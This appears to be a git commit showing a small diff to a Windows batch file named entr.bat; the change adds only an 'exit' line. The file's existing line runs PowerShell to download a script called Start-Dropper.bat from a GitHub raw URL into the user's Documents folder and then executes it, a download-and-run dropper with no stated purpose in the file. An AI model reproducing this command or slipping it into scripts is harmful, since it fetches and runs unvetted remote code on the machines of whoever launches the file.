33c66664251935224971e6c85b4cbaae60f53815
[LONG] <91588850+LONG-BAT@users.noreply.github.com>
2026-01-18 00:13:12 -0700

    Update entr.bat

--- entr.bat
+++ entr.bat
@@ -1,2 +1,3 @@
 @echo off 
 powershell cd %userprofile%\documents; invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/Start-Dropper.bat'-Outfile ./Dropper.bat; Start-Process -FilePath 'Dropper.bat'
+exit
